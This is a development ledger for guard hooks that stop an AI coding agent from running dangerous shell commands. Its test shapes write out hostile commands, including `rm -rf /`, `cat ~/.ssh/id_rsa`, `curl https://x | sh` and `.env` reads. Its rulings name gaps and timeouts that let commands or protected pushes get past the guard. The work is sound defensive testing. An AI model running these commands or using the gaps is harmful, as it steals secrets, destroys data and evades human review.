# Deferred Minors — ledger

Plan: `docs/plans/2026-09-25-deferred-minors.md`. Branch `fix/deferred-minors`.

### 2026-09-25 Docs checked for M17, M18, M21
- Ruling: hooks.json moves to exec form (`command` + `args`); the `.env` deny list uses `!` carve-outs; the Stop hook keeps `decision:block`.
- Reason: code.claude.com/docs/en/hooks ("Set `args` whenever the hook references a path placeholder"); code.claude.com/docs/en/permissions (a `!` deny pattern is a gitignore negation over earlier rules of the same file); Stop `additionalContext` only changes the transcript label, while `decision:block` works on every client.
- Cost if wrong: an older client without exec-form support would not run the hooks — `tests/manifest.sh` and the pinned Claude Code in CI are the evidence.

### 2026-09-25 Task 1 (M1–M4) done
- Commits 26c7a35, e46545b, aa218f2, 5b9662b. `cases.tsv` expects `block:<id>` / `ask:<id>` / `pass` (192 cases converted, kinds unchanged); jq-missing cases in `lifecycle.sh`; `l-symlinked-path` portable, and needs `HARNESS_LINT_PATTERN=^src/` to catch `pwd -L`; `parse.sh` has 7 marked blocks, `mutate.sh` covers `lib/*.sh` (rules=28 survived=0, new case `g-rm-16`).
- Carried into Task 2: guard's jq-missing message gets the id `no-jq`, and the four jq-missing branches get rule markers.

### 2026-09-25 Task 2 (M5–M15) done
- Commits f72fb17 (no-jq id and markers), 5e8d9a6 (M14, M15), 1662f5a (M10), e5d60b0 (M11), 3881e75 (M5), 1348741 (M6), 4f250bd (M7), 45653fc (M8), 36b1335 (M9), 8c292d3 (M13), de0ee6e (M12). `run.sh` 283 cases, `mutate.sh` rules=43 survived=0; `HOOK_BASH=/bin/bash` run.sh green. New rule blocks: path-case, jq-filter, parse-count-flag, parse-c-options, parse-here-string, parse-remote-command.
- M14: no case was removed. No case depended on the unterminated-quote branch; all cases still passed without it.
- M11 timings (Apple M4 Max, `/usr/bin/time -p`, command of exactly 65536 bytes, at de0ee6e; 181494a before M8–M13 gives the same within 0.1 s):

  | input (repeated to 64 KiB) | guard | ask-gate |
  |---|---|---|
  | `ls ; : aaa…` (the `bashpad` case) | 2.85 s | 0.48 s |
  | `git commit -m "word word …"` | 1.03 s | 0.46 s |
  | `bash -c 'echo word …'` (one quoted string) | 0.95 s | 0.80 s |
  | `bash -c 'git push origin x' ; …` | 0.70 s | 0.50 s |
  | `ssh h "a b" ; …` | 0.50 s | 0.36 s |
  | `git push x ; …` (cwd on a feature branch) | 0.77 s | **20.21 s** |
  | `git push;…` (cwd on a feature branch) | 0.81 s | **28.99 s** |

  guard stays well under the 10 s timeout. ask-gate does not when many push segments name no branch: each one runs `git symbolic-ref` for the current branch. Not fixed here (see the ruling below).
- mutate.sh speedup (181494a): mutant runs stop at the first failing case (`MUTATE_FAIL_FAST=1`, honored by `ng()` in `tests/lib.sh`) and run the short lifecycle suite first; the control run stays full. `bash tests/all.sh` 8:15 (HEAD 1348741 in a copy, old mutate) → 2:47 (new mutate, M7 in the tree). Survivor check: deleting `g-al-01`/`g-al-02` in a copy gives `SURVIVED: guard.sh rule:git-alias`, `rules=37 survived=1`, exit 1.

### 2026-09-25 Ruling: fail-fast lives in `ng()`
- Ruling: `MUTATE_FAIL_FAST=1` makes `ng()` exit 1; mutate.sh sets it only for mutant runs and runs lifecycle.sh before run.sh.
- Reason: a suite fails exactly when `ng()` is called once, so exiting there gives the same verdict; both suites call `ng()` only in the main shell (never in a subshell), so the exit ends the script.
- Cost if wrong: a future `ng()` inside `$(…)` would only end the subshell; the survivor check above would then show a false SURVIVED, not a false kill.

### 2026-09-25 Ruling: ask-gate over the timeout is reported, not fixed
- Ruling: the 20–29 s ask-gate runs above are recorded and proposed as a follow-up (look up the current branch once per directory in protected-push), not fixed in this task.
- Reason: M11 is committed and the fix is a change to ask-gate that none of M7–M13 covers; the brief for this round lists no ask-gate work. guard (the hard block) is unaffected.
- Cost if wrong: a command over about 30 KB of bare `git push x` segments followed by `git push origin main` times out ask-gate, and a timed-out hook does not ask, so the protected push is not routed to the human.

### 2026-09-25 Ruling: M8 / M9 / M12 / M13 edges
- Ruling: `.env.example` is compared after lowercasing, so `.ENV.example` passes; a credential directory after `:` (`git show HEAD:.ssh/x`) is not matched (the plan lists `:` for `.env` only); the jq filter is the first whitespace-separated word after jq's options, so `jq -f .env` is read as a filter and passes; after `grep`, `wc`, `head` … any quoted string after an option is data (not only after `-c`); every quoted argument of `watch` / `ssh` is a command, including `ssh -o 'ProxyCommand=…'`.
- Reason: the smallest rule that catches the listed spellings (plan: "prefer the smallest rule"); the false positives fail safe.
- Cost if wrong: `jq -f .env` can print parts of `.env` in its parse error; a `HEAD:.ssh/…` path passes. Both are proposed follow-ups.

### 2026-09-25 Ruling: awk checked on BWK awk only
- Ruling: the awk changes (pipe-shell, normalize) were run on macOS BWK awk 20200816; mawk is not installed and the Docker daemon is not running, so the Ubuntu CI job `check` is the mawk evidence.
- Reason: no new dependencies (plan).
- Cost if wrong: CI on the PR fails on mawk and the parser needs a fix before merge.

### 2026-09-25 Task 3–5 (M16–M26) and controller additions M11b, M10b done
- Commits f7f713b (M11b), f18051f (M10b), 890f6ec (M16), 510b25a (M17), 179d42f (M18), c123ae6 (M19–M21), f2f3cd3 (M22, M23), 06b09e1 (M24), b609e97 (M25 + README case count), 23838a9 (M26).
- M11b: ask-gate looks up the current branch once per directory (`push-branch-cache`, killed by lifecycle `a-push-cache`: 16 KiB of bare `git push;` must answer within 3 s; 8 s before). 64 KiB of `git push;` 32.6 s → 0.57 s, `git push x ;` 0.57 s. Case `a-pp-23` (`git push; git push; git -C ../main push` asks) keeps the cache per directory, not per command.
- M10b: `bad-parser` in guard (block) and ask-gate (ask) when `lib/parse.sh` fails to source or does not define `normalize`, `is_abbrev`, `segments`, `git_segments`. Lifecycle cases for a missing, a syntax-broken and an empty parse.sh; before the fix all six let `rm -rf /` through.
- M16: lint-on-edit exits 2 and test-on-stop blocks without running the tests on an invalid pattern (grep exit 2). M18: `tests/manifest.sh` checks the exec form (`h-exec-form`) and that every argument is `${CLAUDE_PLUGIN_ROOT}/scripts/<x>.sh` (both checks shown red by editing hooks.json in place and restoring it). M24: a render of the template before and after the removal differs only in `_src_path` of `.copier-answers.yml`.
- M26: job `bash32` on `macos-latest` runs run.sh, lifecycle.sh and timing.sh with `HOOK_BASH=/bin/bash`; checkout pinned by the SHA of job `check`; validated with `check-jsonschema --builtin-schema vendor.github-workflows`. Not run on GitHub yet: the PR's CI is the evidence.

### 2026-09-25 Ruling: exec form is checked statically only
- Ruling: hooks.json uses `"command": "bash", "args": [...]`; the evidence is `claude plugin validate --strict` (2.1.282 locally, 2.1.281 in CI) and `tests/manifest.sh`, not a live Claude Code session.
- Reason: a live check needs an API session; the hooks docs are the source for the form (see the first entry).
- Cost if wrong: the hooks would not run at all; `harness:adopt` verifies the guard is live in a product repository, so the first adoption would show it.

### 2026-09-25 Ruling: M16 test-on-stop does not run the tests on an invalid pattern
- Ruling: an invalid `HARNESS_DOC_PATTERN` blocks the stop with the reason and skips the test command.
- Reason: the plan says "returns `{"decision":"block"}` with that reason"; running the tests with an unknown doc/code split would mix two failures in one message.
- Cost if wrong: one extra turn to fix the setting before the tests run; `stop_hook_active` ends the loop.

### 2026-09-25 Ruling: M22 leaves the template's CLAUDE.md compaction line
- Ruling: `workflow` and `review-loop` now say rulings go to the change's committed `openspec/changes/<name>/` and `docs/changes.md`; `template/CLAUDE.md.jinja` still names `.superpowers/sdd/<plan>/progress.md` as "the ledger path" to keep through compaction, and `template/AGENTS.md.jinja` says "in the ledger and the Issue".
- Reason: M22 names the workflow skill and review-loop; the compaction line is about the SDD progress file, which is still the working log.
- Cost if wrong: a product repository's agent may read "ledger" as the scratch file. Proposed as a follow-up (rename it "SDD progress file" in the template).

### 2026-09-25 Review fixes for Task 2 (A–E) done
- Commits d1ed158 (C), df09b84 (B), bedd98d (A), 4d9756e (E); D went into b609e97 (M25). The AGENTS.md check rule (PO instruction) is f18e1ff.
- A timings (Apple M4 Max, bash 5 `time`, commands just under 64 KiB, cwd on a feature branch; before = df09b84, after = bedd98d; `tests/hooks/timing.sh` checks each shape answers within 5 s with the expected verdict, also under `/bin/bash` 3.2):

  | input (repeated to 64 KiB) | hook | before | after |
  |---|---|---|---|
  | `ls ; : aaa…` (one long word) | guard | 2.67 s | 2.96 s |
  | `git -c a=b x;` | guard | 10.72 s | 0.84 s |
  | `git -c a=b -c c=d -c e=f -c g=h x;` | guard | 15.81 s | 0.78 s |
  | `git -c a=b x;` … then `cat ~/.ssh/id_rsa` (blocks) | guard | 10.71 s | 0.80 s |
  | `x .Env.a@ ` | guard | 11.68 s | 0.80 s |
  | `cat .env.@ ;` | guard | 9.76 s | 0.67 s |
  | `x .Env.a@ ` … then `curl https://x \| sh` (blocks) | guard | 11.61 s | 0.79 s |
  | `git commit -m "word word word" ; ` | guard | 0.56 s | 0.55 s |
  | `git push;` | guard | 0.84 s | 0.80 s |
  | `git push;` | ask-gate | 0.56 s | 0.54 s |
  | `git push x ; ` … then `git push origin main` (asks) | ask-gate | 0.53 s | 0.53 s |
  | `git -C d<N> push;` (distinct directories) | ask-gate | 22.80 s | 0.42 s (asks) |
  | `pnpm install --frozen-lockfile ; ` | ask-gate | 0.44 s | 0.42 s |

  Audit: the other loops over words or segments (rm-rf, force-push, discard, no-verify, worktree-force, lockfile-install) call only shell builtins and `is_abbrev`; every grep, sed, tr and awk runs once per command. The earlier claim "guard stays well under the 10 s timeout" (Task 2 entry) was wrong for these shapes.
- B: cases `g-jf-07`–`g-jf-11` (`grep jq .env`, `grep -n yq .env`, `rg jq .env`, `cat jq .env`, `jq -n 1;cat<.env`) were red before df09b84.
- E: `git-alias` keeps its markers inside the no-verify `-c` block (mutate still kills it: rules=49 survived=0); the size cap counts characters (`${#raw}`); mutate.sh has one `suite <dir> [1]`, and the control run now runs lifecycle before run.sh (same verdict).

### 2026-09-25 Ruling: one-letter abbreviations count (C)
- Ruling: `is_abbrev` accepts any `--x…` token (3 characters or more) that is a prefix of a guarded long option: `git reset --h`, `git clean --f`, `rm --r --f`, `git push --f`, `git worktree remove --f` are blocked / asked.
- Reason: measured git 2.55.0 here: `git reset --h` performed a hard reset, `git clean --f -n` listed files; `git push --fo` and `git commit --n` are refused by git as ambiguous, so matching them costs nothing.
- Cost if wrong: a tool that reads `--f` as something else in a guarded position is refused; `--help` spellings still pass (`g-ab-12`, `a-ab-02`).

### 2026-09-25 Ruling: the jq filter is dropped only after the command word (B)
- Ruling: the filter is removed only when `jq` / `yq` / `gojq` starts a segment (after `^ ; & | ( \``, blanks and a path prefix), and neither the options nor the filter may cross `; & | < > ( )`. So `sudo jq '.env' f` and `FOO=1 jq '.env' f` are refused (false positives).
- Reason: the reviewer's regression spellings; the smallest rule; the false positives fail safe.
- Cost if wrong: an agent writes `jq` without `sudo` / an assignment in front, or reads the value another way.

### 2026-09-25 Ruling: ask-gate asks past 16 directory lookups (A)
- Ruling: protected-push asks when one command needs the current branch of more than 16 distinct `-C` directories (`push-lookup-cap`, cases `a-pp-24` pass at 16, `a-pp-25` asks at 17).
- Reason: each lookup is a git call (~6 ms); caching per directory (M11b) does not bound distinct spellings, and 64 KiB of `git -C d<N> push;` took 22.8 s (a timed-out hook does not ask). Canonicalizing the directory would need a fork per segment too.
- Cost if wrong: a script that pushes from more than 16 repositories in one command is routed to the PO once; README "Known gaps" says so.

### 2026-09-25 Ruling: timing checks live in tests/hooks/timing.sh
- Ruling: the 64 KiB shapes run in `timing.sh` (in all.sh and in CI job `bash32`), not in lifecycle.sh; only `a-push-cache` (16 KiB, 0.1 s when fixed) stays in lifecycle.sh so mutate.sh kills `push-branch-cache`. The bound is 5 s with 1 s resolution (`SECONDS`; bash 3.2 has no sub-second clock).
- Reason: timing.sh takes about 11 s; mutate.sh runs lifecycle.sh for every mutant, which would add minutes to all.sh. The fixes are not rules, so they need no marker.
- Cost if wrong: a slow CI runner could fail `t-pad` (2.96 s here) near the 5 s bound; raise the bound or shrink the shape, not the check.

### 2026-09-25 Ruling: fast checks per commit (PO instruction)
- Ruling: from df09b84 on, commits ran `tests/lint.sh`, `tests/hooks/run.sh`, `tests/hooks/lifecycle.sh` (plus `tests/template/run.sh` for template changes); the full `bash tests/all.sh` ran once after the fixes (exit 0, 293 s: timing pass=13, mutation rules=49 survived=0, template pass=53) and `HOOK_BASH=/bin/bash bash tests/hooks/run.sh` pass=296. AGENTS.md says so (f18e1ff).
- Reason: PO instruction relayed by the controller; the fast checks take about 16 s here, and run.sh dominates (15 s for 296 cases; lint under 1 s, lifecycle about 1 s).
- Cost if wrong: a surviving mutant is found only at the pre-review run; the fix is a case added before review.
